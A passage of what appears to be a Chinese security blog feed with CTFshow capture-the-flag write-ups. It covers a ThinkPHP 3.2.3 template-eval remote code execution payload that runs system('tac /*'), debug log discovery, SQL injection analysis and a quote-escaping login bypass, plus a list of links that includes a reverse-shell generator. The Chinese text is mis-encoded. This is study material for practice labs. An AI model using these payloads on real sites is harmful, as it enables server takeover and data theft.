punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">view</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¾€ä¸‹çœ‹è°ƒç”¨çš„displayæ–¹æ³•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">display</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">G</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'viewStartTime'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è§†å›¾å¼€å§‹æ ‡ç­¾</span>    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_begin'</span><span class="token punctuation">,</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è§£æå¹¶è·å–æ¨¡æ¿å†…å®¹</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è¾“å‡ºæ¨¡æ¿å†…å®¹</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è§†å›¾ç»“æŸæ ‡ç­¾</span>    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$templateFile</span>   <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseTemplate</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æ¨¡æ¿æ–‡ä»¶ä¸å­˜åœ¨ç›´æ¥è¿”å›</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_TEMPLATE_NOT_EXIST_'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">':'</span><span class="token operator">.</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">defined</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'THEME_PATH'</span><span class="token punctuation">)</span> <span class="token keyword">or</span>    <span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'THEME_PATH'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getThemePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// é¡µé¢ç¼“å­˜</span>    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ob_implicit_flush</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ä½¿ç”¨PHPåŸç”Ÿæ¨¡æ¿</span>        <span class="token variable">$_content</span>   <span class="token operator">=</span>   <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token comment">// æ¨¡æ¿é˜µåˆ—å˜é‡åˆ†è§£æˆä¸ºç‹¬ç«‹å˜é‡</span>        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// ç›´æ¥è½½å…¥PHPæ¨¡æ¿</span>        <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">include</span> <span class="token variable">$templateFile</span><span class="token punctuation">:</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span><span class="token operator">.</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token comment">// è§†å›¾è§£ææ ‡ç­¾</span>        <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'var'</span><span class="token operator">=></span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tVar</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token operator">=></span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'content'</span><span class="token operator">=></span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'prefix'</span><span class="token operator">=></span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_parse'</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// è·å–å¹¶æ¸…ç©ºç¼“å­˜</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">ob_get_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å†…å®¹è¿‡æ»¤æ ‡ç­¾</span>    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_filter'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// è¾“å‡ºæ¨¡æ¿æ–‡ä»¶</span>    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨<code>TMPL_ENGINE_TYPE==&#39;php&#39;</code>æ—¶ï¼Œå…³é”®å°±åœ¨è¿™å¥è¯äº†<code>include $templateFile:eval(&#39;?&gt;&#39;.$_content);</code>æ­¤å¤„çš„<code>$_content</code>æˆ‘ä»¬æ˜¯å®Œå…¨å¯æ§çš„ï¼Œä¹Ÿå°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤</p><p>è€Œå½“<code>TMPL_ENGINE_TYPE!=&#39;php&#39;</code>æ—¶ï¼Œæ‰§è¡Œçš„Hookä¸­çš„listenæ–¹æ³•ï¼Œç„¶åæ‰§è¡Œexecæ–¹æ³•ï¼Œç„¶årunæ–¹æ³•ï¼Œæœ€ååŠ è½½å¹¶åŒ…å«ä¸€ä¸ªç¼“å­˜æ–‡ä»¶</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">listen</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$params</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'Start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ '</span><span class="token operator">.</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">' ] --START--'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token constant">APP_DEBUG</span> <span class="token operator">&amp;&amp;</span> <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$result</span> <span class="token operator">=</span>   <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$tag</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Run '</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">' [ RunTime:'</span><span class="token operator">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_start'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_end'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'s ]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// å¦‚æœè¿”å›false åˆ™ä¸­æ–­æ’ä»¶æ‰§è¡Œ</span>                <span class="token keyword">return</span> <span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// è®°å½•è¡Œä¸ºçš„æ‰§è¡Œæ—¥å¿—</span>            <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ '</span><span class="token operator">.</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">' ] --END-- [ RunTime:'</span><span class="token operator">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'Start'</span><span class="token punctuation">,</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'End'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'s ]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">public function load($_filename,$vars&#x3D;null)&#123;    if(!is_null($vars))        extract($vars, EXTR_OVERWRITE);    eval(&#39;?&gt;&#39;.$this-&gt;read($_filename));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;Home&#x2F;Index&#x2F;index?n&#x3D;&lt;?php%20system(%27tac%20&#x2F;*%27);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>572</strong></p><p>ThinkPHPæ—¥å¿—æ–‡ä»¶</p><p>é¢˜ç›®ä¸­æåˆ°äº†çˆ†ç ´ï¼Œåœ¨thinkphpå¼€å¯debugçš„æƒ…å†µä¸‹ä¼šåœ¨Runtimeç›®å½•ä¸‹ç”Ÿæˆlogæ–‡ä»¶ï¼Œæ–‡ä»¶çš„åç§°æ˜¯ä»¥<code>å¹´_æœˆ_æ—¥.log</code>æ¥å‘½åçš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¥çˆ†ç ´æ–‡ä»¶å</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;xx_xx_xx.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206131917820.png"></p><p>æ‰«å‡ºäº†è¿™ä¹ˆä¸ªæ–‡ä»¶ï¼Œå‘ç°ä¼¼ä¹ä¼ å‚showctfå¯æ‰§è¡Œphpä»£ç ï¼Œæ‹¿åˆ°flag</p><p><strong>573</strong></p><p><strong>ThinkPHP 3.2.3sqlæ³¨å…¥æ¼æ´</strong></p><p>å…ˆå†™ä¸ªå¯ä»¥è°ƒç”¨å†…ç½®sqlæŸ¥è¯¢çš„ä¸»é¡µ</p><pre class="line-numbers language-none"><code class="language-none">class IndexController extends Controller &#123;    public function index()&#123;    $a&#x3D;M(&#39;xxx&#39;);  &#x2F;&#x2F;è¡¨å    $id&#x3D;I(&#39;GET.id&#39;);    $b&#x3D;$a-&gt;find($id);    var_dump($b);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨Iæ–¹æ³•ä¸­å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œé»˜è®¤è¿‡æ»¤å™¨<code>DEFAULT_FILTER</code>æ˜¯ä¸ä¼šå¯¹å•å¼•å·åšè¿‡æ»¤æ“ä½œçš„ï¼Œæ‰€ä»¥æ­¤å¤„ä¸ç”¨ç®¡ï¼Œä¸‹é¢èµ°<code>think_filter</code>æ–¹æ³•ï¼Œè¿™é‡Œå¯¹ä¸€äº›æ•æ„Ÿå®‰å…¨å†…å®¹è¿›è¡Œäº†è¿‡æ»¤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">think_filter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// TODO å…¶ä»–å®‰å…¨è¿‡æ»¤</span><span class="token comment">// è¿‡æ»¤æŸ¥è¯¢ç‰¹æ®Šå­—ç¬¦</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$value</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>OKï¼Œè¾“å…¥æ£€æŸ¥å®Œæ¯•ï¼Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¿›å…¥åˆ°<code>find</code>æ–¹æ³•ä¸­ï¼Œè¿™é‡Œçš„æ³¨é‡Šä¹Ÿå¯¹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åšäº†è¯¦ç»†çš„è§£é‡Šï¼Œä¸‹ä¸€æ­¥è¿›ä¸€æ­¥è·Ÿè¸ª<code>_parseOptions</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¸ª<code>_parseType</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯¹å†…å®¹ç±»å‹è¿›è¡Œè§£æ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * æŸ¥è¯¢æ•°æ® * @access public * @param mixed $options è¡¨è¾¾å¼å‚æ•° * @return mixed */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">if(is_scalar($val)) &#123;    $this-&gt;_parseType($options[&#39;where&#39;],$key);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">elseif(false &#x3D;&#x3D;&#x3D; strpos($fieldType,&#39;bigint&#39;) &amp;&amp; false !&#x3D;&#x3D; strpos($fieldType,&#39;int&#39;)) &#123;                $data[$key]   &#x3D;  intval($data[$key]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å…ˆæ”¾ä¸€ä¸ªyuå¸ˆå‚…çš„<a href="https://blog.csdn.net/miuzzx/article/details/119424071">ä»£ç å®¡è®¡</a>ï¼Œä»¥åå†å›æ¥çœ‹</p><p><strong>574</strong></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¤§ä½¬æ–‡ç« åˆé›†</title>
      <link href="/posts/f85e0a9a.html"/>
      <url>/posts/f85e0a9a.html</url>
      
        <content type="html"><![CDATA[<h3 id="CTF-PHPååºåˆ—åŒ–æ€»ç»“"><a href="#CTF-PHPååºåˆ—åŒ–æ€»ç»“" class="headerlink" title="[CTF]PHPååºåˆ—åŒ–æ€»ç»“"></a><a href="https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">[CTF]PHPååºåˆ—åŒ–æ€»ç»“</a></h3><h3 id="CTF-htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“"><a href="#CTF-htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“" class="headerlink" title="[CTF].htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“"></a><a href="https://blog.csdn.net/solitudi/article/details/116666720">[CTF].htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“</a></h3><h3 id="Webå®‰å…¨å­¦ä¹ ç¬”è®°"><a href="#Webå®‰å…¨å­¦ä¹ ç¬”è®°" class="headerlink" title="Webå®‰å…¨å­¦ä¹ ç¬”è®°"></a><a href="https://websec.readthedocs.io/zh/latest/index.html">Webå®‰å…¨å­¦ä¹ ç¬”è®°</a></h3><h3 id="Java-Webå®‰å…¨"><a href="#Java-Webå®‰å…¨" class="headerlink" title="Java Webå®‰å…¨"></a><a href="https://javasec.org/">Java Webå®‰å…¨</a></h3><h3 id="åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨"><a href="#åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨" class="headerlink" title="åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨"></a><a href="https://www.revshells.com/">åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨</a></h3><h3 id="PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶"><a href="#PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶"></a><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶</a></h3><h3 id="Java-Webå…¥é—¨"><a href="#Java-Webå…¥é—¨" class="headerlink" title="Java Webå…¥é—¨"></a><a href="https://www.bookstack.cn/read/Heart-First-JavaWeb/source-README.md">Java Webå…¥é—¨</a></h3><h3 id="ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„-XSS-ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ"><a href="#ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„-XSS-ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„ XSS ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ"></a><a href="https://www.tr0y.wang/2020/08/18/IDN/">ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„ XSS ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ</a></h3><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowå¤§èµ›åŸé¢˜</title>
      <link href="/posts/76fe6b8e.html"/>
      <url>/posts/76fe6b8e.html</url>
      
        <content type="html"><![CDATA[<p><strong>680</strong></p><p>postä¼ å…¥<code>code=phpinfo();</code>æ‰§è¡ŒæˆåŠŸï¼ŒæŸ¥çœ‹è¢«banå‡½æ•°ï¼Œæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨åŸç”Ÿç±»æŸ¥çœ‹æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">code&#x3D;$a&#x3D;new FilesystemIterator(&quot;.&quot;);var_dump ($a);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090028188.png"></p><p>ä¸‹è½½æ–‡ä»¶å³å¯</p><p><strong>681</strong></p><p>æŠ“åŒ…å‘ç°è¿”å›å†…å®¹ä¸ºsqlè¯­å¥</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090039242.png"></p><p>è¿‡æ»¤äº†ç©ºæ ¼å’Œå¼•å·ï¼Œä¼šè¢«åï¼Œå°è¯•æ„é€ payloadï¼Œå‘ç°#å¯ç”¨ï¼Œ\å¯ç”¨ï¼Œæ„é€ è¯­å¥<code>||1#\</code>æ­¤æ—¶æ‰§è¡Œè¯­å¥ä¸º</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'||1#\' or nickname = '</span><span class="token operator">||</span><span class="token number">1</span><span class="token comment">#\'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç›¸å½“äºåˆ¤æ–­usernameæ˜¯å¦ç­‰äº<code>||1&#39; or nickname = </code>è¿™ä¸€å­—ç¬¦ä¸²æˆ–ä¸€ï¼Œç»“æœæ°¸çœŸï¼Œç™»å½•å³å¯æ‹¿åˆ°flag</p><p><strong>682</strong></p><p>è¿™è¾ˆå­ç¬¬ä¸€æ¬¡ç¢°åˆ°jsä»£ç å®¡è®¡ï¼Œçœ‹å‘—</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">c2n</span>  <span class="token operator">=</span> <span class="token parameter">c</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>length<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0x60</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0x67</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token 